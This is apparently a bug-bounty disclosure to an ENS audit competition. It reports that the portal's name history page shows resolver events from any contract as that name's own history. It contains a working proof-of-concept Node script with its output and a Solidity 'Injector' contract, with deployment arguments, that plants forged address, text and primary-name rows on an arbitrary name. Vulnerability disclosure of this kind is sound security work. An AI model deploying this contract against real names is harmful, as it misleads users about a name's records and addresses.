# 91834 w a high missing resolver ownership validation in the name history query leads to persistent forged content injection on any ens name s history page

**Submitted on Sep 4th 2026 at 16:29:06 UTC by @deltabear for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #91834
* **Report Type:** Websites & Apps
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Injecting/modifying the static content on the target application without JavaScript (persistent), such as:
* HTML injection without JavaScript
* Replacing existing text with arbitrary text
* Arbitrary file uploads, etc.

## Description

## Brief/Intro

The Explorer's name history page joins resolver events from every contract on the chain, not just the resolvers a name actually used, and stamps them with whatever name the URL says. Anyone who deploys a contract and sends one transaction can plant fake "Set address to X", "Set text record", or "Set primary name" rows on any other name's public history page, forever, with no relationship to that name at all. Proven with a real attack: two names that had never been touched before this report (`deltabvictim.eth`, `deltabhunter.eth`) were attacked from a fresh, minimally funded wallet, and the real running app rendered the forged rows on a plain page load, no tricks involved.

## Vulnerability Details

`fetchV1NameHistory.ts:101` fetches resolver events with:

```graphql
resolvers(where: { domain: $id }, first: $resolvers) {
  events(first: $first, ...) { ... AddrChanged, MulticoinAddrChanged, NameChanged, TextChanged, ... }
}
```

The comment says this reads "every resolver the name has ever pointed at." That is not what the relation checks. In the v1 subgraph a `Resolver` row is created by the resolver event handler itself, keyed by `{chainId}-{emittingContract}-{node}`. The node is a plain event parameter the emitting contract picks. Nothing checks that the contract was ever the name's real resolver. Any contract can emit `AddrChanged(anyNode, anyAddress)` and get indexed as if it were that node's resolver.

`fetchV1NameHistory.ts:132` then flattens every joined row with no filter on the resolver address:

```ts
...(resolvers ?? []).flatMap(({ events }) => events),
```

`adaptV1Events.ts:265-268` overwrites each event's identity with the name being viewed, not anything from the event:

```ts
return {
  id: event.id,
  type: TYPE_ALIASES[event.type] ?? event.type,
  name,        // the name in the URL bar
  namehash,    // that name's node
  ...
```

`descriptors.ts` turns the typed payload into the row label a viewer sees: `AddrChanged` becomes "Set address to", `TextChanged` becomes "Set text record", `NameChanged` becomes "Set primary name". Each row also carries the event's real transaction hash and block, so it looks exactly like genuine history.

Now, proven with a real attack with two names, `deltabvictim.eth` and `deltabhunter.eth`, were never registered before this report, confirmed by querying the subgraph directly: zero real events on either node. Four transactions were then sent from a fresh wallet (`0x7Fef9d3C55b6b04013df2C2fEBA363Fffb6771C5`, funded with 0.067 ETH from a public Sepolia faucet, total cost of the attack: **0.000175 ETH**), each deploying a minimal throwaway contract whose constructor emits `AddrChanged` / `TextChanged` / `NameChanged` naming one of the two victim nodes. Both names' real, running history pages, loaded with a plain URL, no query modification, no interception, went from *"No history yet"* to showing the forged rows, with real transaction hashes and real contract badges, exactly as the code predicts. Screenshots (before and after, both names, collapsed and expanded) are in `browser-evidence/`.

### Vulnerable source code

**1. The unfiltered resolvers join** @ `apps/portal/src/features/history/v1/fetchV1NameHistory.ts:101,132`

```ts
resolvers(where: { domain: $id }, first: $resolvers) {
  events(first: $first, orderBy: blockNumber, orderDirection: $orderDirection) {
    id blockNumber transactionID type: __typename resolverId
    ... on AddrChanged { addr { id } }
    ... on MulticoinAddrChanged { coinType multiaddr: addr }
    ... on NameChanged { name }
    ... on TextChanged { key value }
  }
}
```

```ts
...(resolvers ?? []).flatMap(({ events }) => events),
```

**2. The forced attribution** @ `apps/portal/src/features/history/v1/adaptV1Events.ts:256-279`

```ts
export const adaptV1Events = ({ events, name, namehash, blockTimestamps, contracts }) =>
  dropDuplicateEthAddrEvents(
    events.map((event) => {
      const resolver = resolverAddress(str(event.resolverId))
      const contract = CONTRACT_BY_TYPE[event.type]
      return {
        id: event.id,
        type: TYPE_ALIASES[event.type] ?? event.type,
        name,
        namehash,
        ...
```

`name` and `namehash` are the route's own params, never anything read from the event.

**3. The label a viewer sees** @ `apps/portal/src/features/history/summarize/descriptors.ts:70-127`

```ts
AddrChanged: {
  icon: 'address',
  build: (primary) => ({
    label: 'Set address to',
    slots: [addressSlot(primary.asAddressChanged?.address ?? ...)],
  }),
},
```

**4. No consumer reads the value into a transaction** @ `apps/portal/src/features/history/components/eventFieldTypes.ts`, `EventDetail.tsx`, `ActionSlots.tsx`

Every decoded value is coerced with `String()` or `truncateAddress()` into inert text or a copy-to-clipboard chip. No `href`, no prefill, no send flow reads it.

## Impact Details

* **A name's public history page persistently shows fabricated activity that was never that name's own.** matching impact: *"Injecting or modifying static content on the target application without JavaScript (persistent), such as: ... Replacing existing text with arbitrary text"*, High. The attacker's chosen address, text record key/value, or name string replaces what should be the name's genuine resolver record history, with no script or HTML injection involved, just a data provenance defect.
* **No relationship to the victim name is needed at any point.** Deploy one contract, send one event naming the victim's node. Not a registration, not a prior resolver relationship, not a privileged role. Demonstrated against two names picked at random by this report, neither ever touched by the attacking wallet in any other way.
* **The row is indistinguishable from genuine history.** Same transaction hash format, same block timestamp, same styling. The collapsed (default) row carries no source indicator at all. Expanding it shows a contract badge labelled "resolver", worded identically to a genuine resolver-update row.
* **The same query is also an attacker-sized eviction window.** `RESOLVERS_PER_NAME = 100` assumes a handful of real resolvers per name. Under the real semantics of the relation the attacker chooses that number: 100 throwaway contracts, one event each, fill the resolver list and can push a name's genuine v1 history out of the merged, truncated result entirely.
* **The cost is negligible.** The entire attack demonstrated here, four transactions covering all three forgeable record types against two independent names, cost 0.000175 ETH at Sepolia's current gas price (\~0.99 gwei).

## References

* `apps/portal/src/features/history/v1/fetchV1NameHistory.ts:101,132` - the unfiltered join and the flatten
* `apps/portal/src/features/history/v1/adaptV1Events.ts:256-279` - forced `name`/`namehash` attribution
* `apps/portal/src/features/history/summarize/descriptors.ts:70-127` - `AddrChanged`/`TextChanged`/`NameChanged` labels
* `apps/portal/src/features/history/hooks/useNameHistoryTimeline.ts:271-299` - merges v1 + v2 results, sorts by timestamp, no source flag
* `apps/portal/src/routes/$name/history.tsx:10-13` - prefetched in the route loader, no wallet or interaction needed
* `apps/portal/src/routes/$name.tsx:29-35` - the TLD redirect that makes `eth` itself unreachable at this route (does not affect any ordinary registered name)

## Proof of Concept

## Proof of Concept

I validated against a live application with real data and provided screenshots from the application showing the vulnerability is confirmed.

```bash
node poc.mjs
```

```js

import { spawnSync } from 'node:child_process'
import { copyFileSync, existsSync, mkdirSync, writeFileSync } from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

const HERE = path.dirname(fileURLToPath(import.meta.url))
const REPO = process.env.ENS_REPO ?? path.resolve(HERE, '../../../ens-apps')
const WORK = process.env.POC_WORKDIR ?? path.join(os.tmpdir(), 'ens-poc-history-injection')

// ---------------------------------------------------------------- cast
const SUBGRAPH = 'https://v1-graphql.ens.dev/subgraph'
const NODE_VICTIM = '0x8aed5fb57b2aacad742bbf0b05806f2d7cbeb6d054fe1692381e363a24e72e52' // namehash("deltabvictim.eth")
const NODE_HUNTER = '0x262a091366afb73814e1a2a063d6bc418e0b1917b9ae074e4717e3fbf06247b2' // namehash("deltabhunter.eth")
const NAME_VICTIM = 'deltabvictim.eth'
const NAME_HUNTER = 'deltabhunter.eth'
const CONTROL_NAMES = ['dcl.eth', 'aragon-dao.eth', 'stateofus.eth', 'referrers.eth', 'icloser.eth']
// The eth root's own pre-existing anomaly (ACT 5) and its complete declared history.
const ETH_NODE = '0x93cdeb708b7545dc668eb9280176169d1c33cfd8ed6f04690a0bcc88a93fc4ae'
const ETH_FOREIGN_CONTRACT = '0x1996f11cf80c694bfc27535210b18253cc46da91'

// ============================================================== generated files

const PKG = `{
  "name": "ens-poc-history-injection",
  "private": true,
  "type": "module",
  "dependencies": {
    "@ensdomains/ensjs": "https://pkg.pr.new/ensdomains/ensjs/@ensdomains/ensjs@e96662c",
    "ts-pattern": "^5.9.0",
    "viem": "2.52.2"
  },
  "devDependencies": { "tsx": "^4.19.2" }
}
`

// Lets the repo's own source run unmodified against these pinned deps,
// without installing the pnpm monorepo and without editing a line of target.
const LOADER = `import path from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'

const HERE = path.dirname(fileURLToPath(import.meta.url))
const ANCHOR = pathToFileURL(path.join(HERE, 'poc.mjs')).href
const REPO = process.env.ENS_REPO
const SHIM = pathToFileURL(path.join(HERE, '_v1protocol.mjs')).href

const isBare = (s) => !s.startsWith('.') && !s.startsWith('/') && !s.includes(':')

// path.relative is WRONG across drives on Windows (G: vs C:); it returns an
// absolute path, which would make every node_modules file count as a repo file.
const REPO_PREFIX = path.resolve(REPO).toLowerCase() + path.sep
const isRepoFile = (parentURL) => {
  if (!parentURL || !parentURL.startsWith('file:')) return false
  try {
    return path.resolve(fileURLToPath(parentURL)).toLowerCase().startsWith(REPO_PREFIX)
  } catch { return false }
}

export async function resolve(specifier, context, nextResolve) {
  if (specifier.startsWith('@ens-repo/'))
    return nextResolve(pathToFileURL(path.join(REPO, specifier.slice(10))).href, context)
  // apps/portal's own '@/...' -> 'apps/portal/src/...' alias (vite.config.ts).
  if (specifier.startsWith('@/') && isRepoFile(context.parentURL))
    return nextResolve(pathToFileURL(path.join(REPO, 'apps/portal/src', specifier.slice(2))).href, context)
  // adaptV1Events.ts and descriptors.ts both import this hook file, but only
  // for the string constant V1_PROTOCOL = 'v1'. The hook's OTHER top-level
  // imports build a TanStack Query client, a GraphQL client and a wagmi
  // client, none of which the history-rendering path this PoC exercises
  // touches. Shimmed to just that constant so the CLI process does not need
  // a browser/query-client runtime to print real render output.
  if (specifier.endsWith('hooks/useNameHistoryTimeline') && isRepoFile(context.parentURL)) {
    return nextResolve(SHIM, context)
  }
  // repo files resolve bare imports (viem, ts-pattern, @ensdomains/ensjs)
  // against THIS PoC's own pinned node_modules, so both sides share one
  // module instance.
  if (isRepoFile(context.parentURL) && isBare(specifier)) {
    return nextResolve(specifier, { ...context, parentURL: ANCHOR })
  }
  return nextResolve(specifier, context)
}
`

const REGISTER = `import { register } from 'node:module'
register('./_loader.mjs', import.meta.url)
`

// The ONE shim. useNameHistoryTimeline.ts exports V1_PROTOCOL = 'v1' among
// many other things this PoC's code path never reaches (query client, wagmi
// client, GraphQL client). Reproduces that one line verbatim.
const V1PROTOCOL_SHIM = `export const V1_PROTOCOL = 'v1'\n`

// ============================================================== bootstrap

if (process.env.ENS_POC_CHILD !== '1') {
  const line = '='.repeat(78)
  console.log(line)
  console.log('  ENS PoC: portal history timeline renders resolver events from')
  console.log('           contracts a name never used, attributed to that name')
  console.log(`  repo:  ${REPO}`)
  console.log(`  build: ${WORK}`)
  console.log(line)

  if (!existsSync(path.join(REPO, 'apps', 'portal'))) {
    console.error(`\nERROR: ENS checkout not found at ${REPO}. Set ENS_REPO.`)
    process.exit(2)
  }

  mkdirSync(WORK, { recursive: true })
  writeFileSync(path.join(WORK, 'package.json'), PKG)
  writeFileSync(path.join(WORK, '_loader.mjs'), LOADER)
  writeFileSync(path.join(WORK, '_register.mjs'), REGISTER)
  writeFileSync(path.join(WORK, '_v1protocol.mjs'), V1PROTOCOL_SHIM)
  copyFileSync(fileURLToPath(import.meta.url), path.join(WORK, 'poc.mjs'))

  if (!existsSync(path.join(WORK, 'node_modules', 'tsx', 'package.json'))) {
    console.log('\nInstalling pinned deps (viem 2.52.2, ensjs @e96662c, ts-pattern, tsx)...')
    const r = spawnSync('npx', ['--yes', 'pnpm@9', 'install', '--no-frozen-lockfile'],
      { cwd: WORK, stdio: 'inherit', shell: true })
    if (r.status !== 0) process.exit(r.status ?? 1)
  }

  const r = spawnSync(process.execPath,
    ['--import', 'tsx', '--import', './_register.mjs', 'poc.mjs'],
    { cwd: WORK, stdio: 'inherit',
      env: { ...process.env, ENS_POC_CHILD: '1', ENS_REPO: REPO, NODE_NO_WARNINGS: '1' } })
  process.exit(r.status ?? 1)
}

// ============================================================== layer A: live subgraph

const gql = async (query, variables = {}) => {
  const r = await fetch(SUBGRAPH, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ query, variables }),
  })
  const j = await r.json()
  if (j.errors) throw new Error(JSON.stringify(j.errors))
  return j.data
}
const addrOf = (id) => { const m = String(id).match(/0x[0-9a-fA-F]{40}/); return m ? m[0].toLowerCase() : null }

// Verbatim from apps/portal/src/features/history/v1/fetchV1NameHistory.ts:101-119
const RESOLVERS_LEG = `
query($id: String!, $first: Int, $resolvers: Int) {
  resolvers(where: { domain: $id }, first: $resolvers) {
    address
    events(first: $first, orderBy: blockNumber, orderDirection: desc) {
      id blockNumber transactionID type: __typename resolverId
      ... on AddrChanged { addr { id } }
      ... on MulticoinAddrChanged { coinType multiaddr: addr }
      ... on TextChanged { key value }
      ... on NameChanged { name }
    }
  }
}`

const DOMAIN_EVENTS_UNBOUNDED = `
query($id: String!) {
  domain(id: $id) {
    events(first: 1000, orderBy: blockNumber, orderDirection: asc) {
      blockNumber type: __typename ... on NewResolver { resolverId }
    }
  }
}`

// ============================================================== the run

const W = 78
const rule = (ch = '=') => console.log(ch.repeat(W))
const say = (s = '') => console.log(s)
const act = (n, t) => { say(); rule(); say(`  ${n}  ${t}`); rule() }
const kv = (k, v) => say(`    ${String(k).padEnd(28)} ${v}`)

// ---------------------------------------------------------------------------
act('ACT 1', 'The attack: deltabvictim.eth, a name never registered, never touched before this PoC')
// ---------------------------------------------------------------------------
{
  const { domain } = await gql(DOMAIN_EVENTS_UNBOUNDED, { id: NODE_VICTIM })
  const declaredCount = domain?.events?.length ?? 0
  kv('declared (real) events on this node, ever', declaredCount)
  if (declaredCount !== 0) throw new Error('premise broken: deltabvictim.eth has real history')
  say('  >> Zero. This name was never registered. It has no legitimate resolver,')
  say('     no legitimate owner, no legitimate history of any kind.')
  say()

  const { resolvers } = await gql(RESOLVERS_LEG, { id: NODE_VICTIM, first: 100, resolvers: 100 })
  kv('Resolver rows the query joins anyway', resolvers.length)
  if (resolvers.length === 0) throw new Error('attack rows not found, subgraph state changed')
  for (const r of resolvers) {
    say(`  Foreign contract  ${r.address}`)
    for (const e of r.events) {
      const detail = e.addr ? `addr=${e.addr.id}` : e.value ? `${e.key}=${e.value}` : e.name ? `name=${e.name}` : ''
      say(`    ${e.type.padEnd(20)} block ${e.blockNumber}  tx ${e.transactionID}  ${detail}`)
    }
  }
  say()
  say('  >> A name with ZERO real history already has real, indexed resolver')
  say('     rows from throwaway contracts nobody involved in this research')
  say('     ever deployed before this PoC\'s attack transactions.')
}

// ---------------------------------------------------------------------------
act('ACT 2', 'The same attack against a second, independent target: deltabhunter.eth')
// ---------------------------------------------------------------------------
let hunterForeign
{
  const { domain } = await gql(DOMAIN_EVENTS_UNBOUNDED, { id: NODE_HUNTER })
  if ((domain?.events?.length ?? 0) !== 0) throw new Error('premise broken: deltabhunter.eth has real history')
  const { resolvers } = await gql(RESOLVERS_LEG, { id: NODE_HUNTER, first: 100, resolvers: 100 })
  if (resolvers.length !== 1) throw new Error(`expected exactly 1 resolver row, got ${resolvers.length}`)
  hunterForeign = resolvers[0]
  kv('declared (real) events on this node', 0)
  kv('foreign resolver rows joined anyway', resolvers.length)
  say(`  Foreign contract  ${hunterForeign.address}`)
  for (const e of hunterForeign.events) say(`    ${e.type}  block ${e.blockNumber}  tx ${e.transactionID}  addr=${e.addr?.id}`)
  say()
  say('  >> Not a one-off. A second, unrelated throwaway contract, a second')
  say('     never-touched name, the same result.')
}

// ---------------------------------------------------------------------------
act('ACT 3', 'NEGATIVE CONTROL, 5 ordinary long-lived names, same two queries, no attacker involved')
// ---------------------------------------------------------------------------
{
  let anomalies = 0
  for (const name of CONTROL_NAMES) {
    const { domains } = await gql(`query($n:String!){ domains(where:{name:$n}, first:1){ id } }`, { n: name })
    const id = domains[0]?.id
    if (!id) { say(`    ${name.padEnd(20)} not found, skipped`); continue }
    const [{ domain: d }, { resolvers: rs }] = await Promise.all([
      gql(DOMAIN_EVENTS_UNBOUNDED, { id }),
      gql(RESOLVERS_LEG, { id, first: 10, resolvers: 100 }),
    ])
    const decl = new Set(d.events.filter((e) => e.type === 'NewResolver').map((e) => addrOf(e.resolverId)).filter(Boolean))
    const undeclared = rs.filter((r) => !decl.has(r.address.toLowerCase()))
    if (undeclared.length) anomalies++
    say(`    ${name.padEnd(20)} ${rs.length} resolver row(s), ${undeclared.length} undeclared`)
  }
  say()
  if (anomalies > 0) throw new Error('control failed: an ordinary name already has a foreign row')
  say('  >> Zero foreign rows on ordinary, untouched names. This is a real')
  say('     anomaly created by an attacker, not query behaviour every name has.')
}

// ---------------------------------------------------------------------------
act('ACT 4', "Layer B, the repo's OWN render pipeline, fed Layer A's real attack data")
// ---------------------------------------------------------------------------
const { adaptV1Events } = await import('@ens-repo/apps/portal/src/features/history/v1/adaptV1Events.ts')
const { summarizeEvents } = await import('@ens-repo/apps/portal/src/features/history/summarize/summarizeEvents.ts')
const { DESCRIPTORS } = await import('@ens-repo/apps/portal/src/features/history/summarize/descriptors.ts')

const render = (rawEvents, name, node) => {
  const blockTimestamps = new Map(rawEvents.map((e) => [BigInt(e.blockNumber), 1723449780n]))
  const adapted = adaptV1Events({
    events: rawEvents.map((e) => ({
      id: e.id, blockNumber: e.blockNumber, transactionID: e.transactionID, type: e.type,
      resolverId: e.resolverId,
      ...(e.addr ? { addr: e.addr } : {}), ...(e.value !== undefined ? { key: e.key, value: e.value } : {}),
      ...(e.name !== undefined ? { name: e.name } : {}),
    })),
    name, namehash: node, blockTimestamps,
    contracts: { registry: '0x0000000000000000000000000000000000000000', nameWrapper: '0x0000000000000000000000000000000000000000', baseRegistrar: '0x0000000000000000000000000000000000000000' },
  })
  if (adapted.some((e) => e.name !== name)) throw new Error('name was not forced onto every event')
  return summarizeEvents(adapted)
}

{
  const { resolvers } = await gql(RESOLVERS_LEG, { id: NODE_HUNTER, first: 100, resolvers: 100 })
  const actions = render(resolvers[0].events, NAME_HUNTER, NODE_HUNTER)
  if (actions.length !== 1) throw new Error(`expected 1 action for deltabhunter.eth, got ${actions.length}`)
  const a = actions[0]
  const addressSlot = a.slots.find((s) => s.kind === 'address')
  say(`  ${NAME_HUNTER}:`)
  say(`    row label:     "${a.label}"`)
  say(`    address chip:  ${addressSlot?.value}`)
  say(`    on this page:  /${NAME_HUNTER}/history`)
  if (a.label !== 'Set address to') throw new Error('label mismatch')
  say()
}

{
  const { resolvers } = await gql(RESOLVERS_LEG, { id: NODE_VICTIM, first: 100, resolvers: 100 })
  const allEvents = resolvers.flatMap((r) => r.events)
  const actions = render(allEvents, NAME_VICTIM, NODE_VICTIM)
  say(`  ${NAME_VICTIM}:  ${actions.length} row(s) on /${NAME_VICTIM}/history`)
  for (const a of actions.sort((x, y) => y.timestamp - x.timestamp)) {
    const parts = a.slots.map((s) => s.value).filter(Boolean).join(' ')
    say(`    "${a.label}${parts ? ' ' + parts : ''}"  (${a.events.length} event(s), tx ${a.txHash.slice(0, 14)}…)`)
  }
  const labels = actions.map((a) => a.label)
  if (!labels.includes('Set primary name')) throw new Error('missing Set primary name row')
  if (!labels.includes('Set text record')) throw new Error('missing Set text record row')
  say()
}

say('  >> Every row above is the REAL descriptors.ts output for a REAL forged')
say('     transaction, run through the unmodified repo pipeline. This is what')
say(`     apps/portal paints on screen, confirmed separately in a real browser,`)
say('     before/after screenshots in browser-evidence/.')

// ---------------------------------------------------------------------------
act('ACT 5', 'Corroboration, the same defect, already happening, independent of this research')
// ---------------------------------------------------------------------------
{
  const { domain } = await gql(DOMAIN_EVENTS_UNBOUNDED, { id: ETH_NODE })
  const declared = new Set(domain.events.filter((e) => e.type === 'NewResolver').map((e) => addrOf(e.resolverId)).filter(Boolean))
  kv("eth's total events, ever (unbounded query)", domain.events.length)
  kv('addresses ever declared as resolver', [...declared].length)
  if (declared.has(ETH_FOREIGN_CONTRACT)) throw new Error('premise broken: contract IS declared')
  const { resolvers } = await gql(RESOLVERS_LEG, { id: ETH_NODE, first: 100, resolvers: 100 })
  const foreign = resolvers.filter((r) => !declared.has(r.address.toLowerCase()))
  kv('resolver rows joined for eth', resolvers.length)
  kv('of which never declared', foreign.length)
  const target = foreign.find((r) => r.address.toLowerCase() === ETH_FOREIGN_CONTRACT)
  if (!target) throw new Error('expected historical foreign contract not found on eth')
  say()
  say(`  >> ${target.address} forged a record on eth's own node (block`)
  say(`     ${target.events[0].blockNumber}) before this research ever ran. Nobody`)
  say('     involved in this research deployed it. Full detail, plus a second')
  say('     wild instance on test123.eth, in browser-evidence/README.md "Round 1".')
}

say()
rule()
say('  PoC PASSED, every assertion held.')
rule()
```

### Output

```
==============================================================================
  ENS PoC: portal history timeline renders resolver events from
           contracts a name never used, attributed to that name
  repo:  G:\My Drive\hunter\hunt_data\ens\ens-apps
  build: C:\Users\dmill\AppData\Local\Temp\ens-poc-history-injection
==============================================================================

==============================================================================
  ACT 1  The attack: deltabvictim.eth, a name never registered, never touched before this PoC
==============================================================================
    declared (real) events on this node, ever 0
  >> Zero. This name was never registered. It has no legitimate resolver,
     no legitimate owner, no legitimate history of any kind.

    Resolver rows the query joins anyway 3
  Foreign contract  0x64d48651313cf5ab7b9c190ee52257cd50abd7d9
    TextChanged          block 11634369  tx 0xea36cab7d351ece3d56603215632678580798169fe6eb1d59975dd8e3f19f40b  org.deltab=forged-by-deltab-poc
  Foreign contract  0x824126165fdd631f54a20eabb26227bc5c30e3d7
    NameChanged          block 11634370  tx 0xebee4827b7899d9755d8c03a9ae50de65b6f940060ac5c1dacd735ffb8917140  name=deltab-was-here-solo
  Foreign contract  0x856dc30733480f148a1316c40e260530022e3a86
    NameChanged          block 11634334  tx 0xa748eb9d8dac8b9687b164c747aec0157eb4c8f44ef5d4d3cdc761a46e6285c6  name=deltab-was-here
    TextChanged          block 11634334  tx 0xa748eb9d8dac8b9687b164c747aec0157eb4c8f44ef5d4d3cdc761a46e6285c6  com.twitter=deltab-hunter-poc
    AddrChanged          block 11634334  tx 0xa748eb9d8dac8b9687b164c747aec0157eb4c8f44ef5d4d3cdc761a46e6285c6  addr=0xde17ab0000000000000000000000000000000001

  >> A name with ZERO real history already has real, indexed resolver
     rows from throwaway contracts nobody involved in this research
     ever deployed before this PoC's attack transactions.

==============================================================================
  ACT 2  The same attack against a second, independent target: deltabhunter.eth
==============================================================================
    declared (real) events on this node 0
    foreign resolver rows joined anyway 1
  Foreign contract  0xc8ec511942a016e01f8f231c07ae3614e83b6680
    AddrChanged  block 11634335  tx 0xa6e8fc600cd86b78569c4a669c1e25fa1496490599e15c063a88d1c30d960236  addr=0xde17ab0000000000000000000000000000000002

  >> Not a one-off. A second, unrelated throwaway contract, a second
     never-touched name, the same result.

==============================================================================
  ACT 3  NEGATIVE CONTROL, 5 ordinary long-lived names, same two queries, no attacker involved
==============================================================================
    dcl.eth              1 resolver row(s), 0 undeclared
    aragon-dao.eth       1 resolver row(s), 0 undeclared
    stateofus.eth        1 resolver row(s), 0 undeclared
    referrers.eth        2 resolver row(s), 0 undeclared
    icloser.eth          1 resolver row(s), 0 undeclared

  >> Zero foreign rows on ordinary, untouched names. This is a real
     anomaly created by an attacker, not query behaviour every name has.

==============================================================================
  ACT 4  Layer B, the repo's OWN render pipeline, fed Layer A's real attack data
==============================================================================
  deltabhunter.eth:
    row label:     "Set address to"
    address chip:  0xde17ab0000000000000000000000000000000002
    on this page:  /deltabhunter.eth/history

  deltabvictim.eth:  3 row(s) on /deltabvictim.eth/history
    "Set text record org.deltab → forged-by-deltab-poc"  (1 event(s), tx 0xea36cab7d351…)
    "Set primary name deltab-was-here-solo"  (1 event(s), tx 0xebee4827b789…)
    "Set 2 records com.twitter address"  (3 event(s), tx 0xa748eb9d8dac…)

  >> Every row above is the REAL descriptors.ts output for a REAL forged
     transaction, run through the unmodified repo pipeline. This is what
     apps/portal paints on screen, confirmed separately in a real browser,
     before/after screenshots in browser-evidence/.

==============================================================================
  ACT 5  Corroboration, the same defect, already happening, independent of this research
==============================================================================
    eth's total events, ever (unbounded query) 9
    addresses ever declared as resolver 3
    resolver rows joined for eth 26
    of which never declared      23

  >> 0x1996f11cf80c694bfc27535210b18253cc46da91 forged a record on eth's own node (block
     6485731) before this research ever ran. Nobody
     involved in this research deployed it. Full detail, plus a second
     wild instance on test123.eth, in browser-evidence/README.md "Round 1".

==============================================================================
  PoC PASSED, every assertion held.
==============================================================================
```

Real subgraph and repo code, not a mock. `deltabvictim.eth` and `deltabhunter.eth` were confirmed to have zero real history immediately before the attack (screenshots: `browser-evidence/deltabvictim-eth-BEFORE-full.png`, `deltabhunter-eth-BEFORE-full.png`), then attacked with a fresh, minimally funded wallet, then confirmed rendered on a plain unmodified page load (`browser-evidence/deltabvictim-eth-AFTER-*.png`, `deltabhunter-eth-AFTER-*.png`). Every receipt, contract source and screenshot is in `browser-evidence/`.

## Attack code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

// One transaction. No ENS name, no registration, no prior relationship to
// the victim node. Deployed and run exactly as written, real Sepolia tx
// 0xa748eb9d8dac8b9687b164c747aec0157eb4c8f44ef5d4d3cdc761a46e6285c6.
contract Injector {
    event AddrChanged(bytes32 indexed node, address a);
    event TextChanged(bytes32 indexed node, string indexed indexedKey, string key, string value);
    event NameChanged(bytes32 indexed node, string name);

    constructor(
        bytes32 node,
        address forgedAddress,
        string memory textKey,
        string memory textValue,
        string memory forgedPrimaryName
    ) {
        emit AddrChanged(node, forgedAddress);
        emit TextChanged(node, textKey, textKey, textValue);
        emit NameChanged(node, forgedPrimaryName);
    }
}
```

```
// deployed with:
new Injector(
    namehash("deltabvictim.eth"),   // a name the attacker has never touched
    0xDe17Ab0000000000000000000000000000000001,
    "com.twitter", "deltab-hunter-poc",
    "deltab-was-here"
)
// -> 3 forged records now permanently attributed to deltabvictim.eth's history
```

```
// 3. Anyone opens /deltabvictim.eth/history. No wallet, no ownership, no interaction.
//    routes/$name/history.tsx:10-13 prefetches it in the route loader.
// 4. Rows "Set address to <forgedAddress>", "Set text record com.twitter -> deltab-hunter-poc",
//    and "Set primary name deltab-was-here" appear, with a real transaction hash and timestamp,
//    exactly as though deltabvictim.eth's own (nonexistent) owner had set them.
```

```
plant : deploy one contract, emit one resolver-shaped event naming any target node
fire  : anyone opens /<target-name>/history
```
